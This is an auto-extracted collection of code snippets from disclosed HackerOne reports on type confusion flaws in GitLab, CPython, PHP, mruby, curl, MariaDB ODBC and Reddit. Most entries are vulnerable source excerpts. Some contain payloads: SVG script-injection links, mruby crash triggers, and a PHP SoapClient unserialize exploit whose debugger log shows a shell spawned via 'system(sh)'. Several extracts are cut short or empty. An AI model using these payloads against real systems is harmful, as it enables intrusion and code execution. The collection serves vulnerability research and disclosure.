# Type confusion — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #960244 Insufficient Type Check leading to Developer ability to delete Project, Repository, Group, ... — gitlab — $5,000 — Type Confusion
Source: `hackerone/reports/2020/960244.md` (https://hackerone.com/reports/960244)

```
module Mutations
  module Metrics
    module Dashboard
      module Annotations
        class Base < BaseMutation
          private

          # This method is defined here in order to be used by `authorized_find!` in the subclasses.
          def find_object(id:)
            GitlabSchema.object_from_id(id)
          end
        end
      end
    end
  end
end
```

```
    annotation = authorized_find!(id: id)

            result = ::Metrics::Dashboard::Annotations::DeleteService.new(context[:current_user], annotation).execute
```

```
Ability.allowed?(user, :delete_metrics_dashboard_annotation, annotation)
```

## #175091 chain.__setstate__ Type Confusion — ibb — $1,000 — Memory Corruption - Generic
Source: `hackerone/reports/2016/175091.md` (https://hackerone.com/reports/175091)

```
    static PyObject *
    chain_setstate(chainobject *lz, PyObject *state)
    {
        PyObject *source, *active=NULL;
```

```
        if (! PyArg_ParseTuple(state, "O|O", &source, &active))
            return NULL;
```

```
        Py_INCREF(source);
        Py_XSETREF(lz->source, source);
        Py_XINCREF(active);
        Py_XSETREF(lz->active, active);
        Py_RETURN_NONE;
    }
```

## #996041 Image queue default key of 'None' and GraphQL unhandled type exception — reddit — $500 — Type Confusion
Source: `hackerone/reports/2021/996041.md` (https://hackerone.com/reports/996041)

```
    <path id="iris-2" data-name="iris" class="cls-4" d="M241.4,143.6s18.5,11.9,36,7.1,29.6-15.8,27.2-24.6c-1.7-6-9.8-9.4-20.3-9.4a59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,60.14,60.14,0,0,0-14.9,18.3" transform="translate(-9.7 -9.3)"/>
    <path id="lid" class="cls-11" d="M304.5,124.4c-1.7-6-9.8-9.4-20.3-9.4a59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,61.21,61.21,0,0,0-14.9,18.1" transform="translate(-9.7 -9.3)"/>
    <path id="pupil-2" data-name="pupil" class="cls-12" d="M256.7,126.1c2.5,9.2,11,14.8,18.9,12.6s12.3-11.4,9.8-20.6a16.59,16.59,0,0,0-1.2-3.1,59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,9.23,9.23,0,0,0,.5,2.5" transform="translate(-9.7 -9.3)"/>
    <path id="eyelash-2" data-name="eyelash" class="cls-13" d="M302.9,122.3c7.7,2.5,17-5,20.8-16.8M292,115.7c7.6,2.8,17.2-4.4,21.4-16M277,115.1c8.1-.3,14.3-10.5,13.9-22.8" transform="translate(-9.7 -9.3)"/>
    <path id="reflection-2" data-name="reflection" class="cls-14" d="M271.1,127.1c0,3.6-2.6,6.5-5.8,6.5s-5.8-2.9-5.8-6.5,2.6-6.4,5.8-6.4,5.8,2.9,5.8,6.4" transform="translate(-9.7 -9.3)"/>
```

```
    <a href="javascript:alert(2)">test 1</a>
    <a xlink:href="javascript:alert(2)">test 2</a>
    <a href="#test3">test 3</a>
    <a xlink:href="#test">test 4</a>
```

```
    <a href="data:data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E">test 5</a>
    <a xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E">test 6</a>
    <use xlink:href="#a" x="28" fill="#1A374D"/>
    <path id="a" d="M14 27v-20c0-3.7-3.3-7-7-7s-7 3.3-7 7v41c0 8.2 9.2 17 20 17s20-9.2 20-20c0-13.3-13.4-21.8-26-18zm6 25c-4 0-7-3-7-7s3-7 7-7 7 3 7 7-3 7-7 7z"/>
    <use xlink:href="defs.svg#icon-1"/>
    <line onload="alert(2)" fill="none" stroke="#000000" stroke-miterlimit="10" x1="119" y1="84.5" x2="454" y2="84.5"/>
```

## #207321 Controlled address leak due to type confusion - ASLR bypass — shopify-scripts — $100 — Information Disclosure
Source: `hackerone/reports/2017/207321.md` (https://hackerone.com/reports/207321)

```
PoC Script:
=======
```

```
And the output varies between runs (because of ASLR) and between architecture (32/64 bit) and seems like this: 
```

```
Vulnerable Code:
===========
The 
```

## #181871 DoS: type confusion in mrb_no_method_error — shopify-scripts — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2017/181871.md` (https://hackerone.com/reports/181871)

```
    NoMethodError.define_singleton_method(:new) do "waat" end
    Object.q
```

## #185041 Type confusion in mrb_exc_set leading to memory corruption — shopify-scripts — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2016/185041.md` (https://hackerone.com/reports/185041)

```
    #define E_NOTIMP_ERROR              (mrb_class_get(mrb, "NotImplementedError"))
```

```
    NotImplementedError = String
    Module.constants # mrb_raise(mrb, E_NOTIMP_ERROR, "Module.constants not implemented");
```

## #3261248 GnuTLS CURLINFO_TLS_SESSION / CURLINFO_TLS_SSL_PTR type confusion — curl — - — Type Confusion
Source: `hackerone/reports/2025/3261248.md` (https://hackerone.com/reports/3261248)

```
struct curl_tlssessioninfo {
  curl_sslbackend backend;
  void *internals;
};
```

```
#elif defined(USE_GNUTLS)
  (void)give_ssl_ctx; /* gnutls always returns its session */
  info->backend = CURLSSLBACKEND_OPENSSL;
  info->internals = ctx->gtls.session;
  return TRUE;
```

## #3891337 Connector/ODBC SQLGetDescRec treats descriptor handle as statement handle, heap OOB write on every call — mariadb — - — Type Confusion
Source: `hackerone/reports/2026/3891337.md` (https://hackerone.com/reports/3891337)

```
SQLRETURN SQL_API SQLGetDescRec(SQLHDESC DescriptorHandle, ...)
{
  CHECK_STMT_CLEAR_ERROR(DescriptorHandle);
  return MADB_DescGetRec(DescriptorHandle, ...);
```

```
sizeof(MADB_Desc)                 = 720
offsetof(MADB_Desc,  Error)       = 96
offsetof(MADB_Stmt,  Error)       = 192
offsetof(MADB_Error, SqlErrorMsg) = 24
offsetof(MADB_Error, SqlState)    = 537
```

```
#define MADB_CLEAR_ERROR(a) do { \
  (a)->SqlState[0]= (a)->SqlState[1]= (a)->SqlState[2]= (a)->SqlState[3]= (a)->SqlState[4]= '0'; \
  (a)->SqlErrorMsg[(a)->PrefixLen]= 0; \
```

## #73245 Type Confusion Vulnerability in SoapClient — ibb — - — None
Source: `hackerone/reports/2015/73245.md` (https://hackerone.com/reports/73245)

```
PHP_METHOD(SoapClient, __getCookies)
{
        zval **cookies, *tmp;

        if (zend_parse_parameters_none() == FAILURE) {
                return;
        }

        array_init(return_value);

        if (zend_hash_find(Z_OBJPROP_P(this_ptr), "_cookies",
sizeof("_cookies"), (void **)&cookies) != FAILURE) {
                zend_hash_copy(Z_ARRVAL_P(return_value), Z_ARRVAL_P(*cookies),
(copy_ctor_func_t) zval_add_ref, (void *)&tmp, sizeof(zval*));
        }
}
```

```
<?php

ini_set("memory_limit", -1);

if ($_SERVER['argc'] < 2) {
        $_SERVER['argv'][1] = 'system(sh);exit;';
}

setup_memory();

$exploit = 'O:10:"SoapClient":1:{s:8:"_cookies";s:'.strlen($hashtable).':"'.$hashtable.'";}';
$z = unserialize($exploit);
// $z = new SoapClient(null, array('location' => "", 'uri' => ""));
// $z->_cookies = $hashtable;
$z->__getCookies();

function setup_memory()
{
        global $str, $hashtable;
        
        $base = 0x114000020;
        $bucket_addr = $base;
        $zval_delta = 0x100;
        $hashtable_delta = 0x200;
        $zval_addr = $base + $zval_delta;
        $hashtable_addr = $base + $hashtable_delta;
        $func_addr = 0x100351e3d; // zend_eval_string()'s address
        
        $bucket  = "\x01\x00\x00\x00\x00\x00\x00\x00";
        $bucket .= "\x00\x00\x00\x00\x00\x00\x00\x00";
        $bucket .= ptr2str($bucket_addr + 3*8);
        $bucket .= ptr2str($zval_addr);
        $bucket .= ptr2str(0);
        $bucket .= ptr2str(0);
        $bucket .= ptr2str(0);
        $bucket .= ptr2str(0);
        $bucket .= ptr2str(0);
        
        $hashtable  = "\x00\x00\x00\x00";
        $hashtable .= "\x00\x00\x00\x00";
        $hashtable .= "\x01\x00\x00\x00";
        $hashtable .= "\x00\x00\x00\x00";
        $hashtable .= "\x00\x00\x00\x00\x00\x00\x00\x00";
        $hashtable .= ptr2str(0);
        $hashtable .= ptr2str($bucket_addr);
        $hashtable .= ptr2str(0);
        $hashtable .= ptr2str(0);
        $hashtable .= ptr2str(
```

```
$ lldb php
(lldb) target create "php"
Current executable set to 'php' (x86_64).
(lldb) run tcpoc.php 'system\(sh\)\;exit\;'
Process 2606 launched: '/usr/bin/php' (x86_64)
sh: no job control in this shell
sh-3.2$ php -v
PHP 5.5.14 (cli) (built: Jan  8 2015 22:33:37)
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
sh-3.2$ exit
exit
Process 2606 exited with status = 0 (0x00000000)
(lldb)
```

## #3973152 37: `curl_mprintf` `%F` format specifier not consumed, causing variadic argument desynchronization — curl — - — Type Confusion
Source: `hackerone/reports/2026/3973152.md` (https://hackerone.com/reports/3973152)

```
case 'f':
  type = MTYPE_DOUBLE;
  break;
// ... e, E, g, G handled ...
default:
  /* invalid instruction, disregard and continue */
  return TRUE;
```

```
if(parse_conversion(*fmt, &flags, &type))
  continue;
```

## #55030 SoapClient's __call() type confusion through unserialize() — ibb — - — None
Source: `hackerone/reports/2015/55030.md` (https://hackerone.com/reports/55030)

```
       HashTable *default_headers = Z_ARRVAL_P(*tmp);
```

```
    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020
```

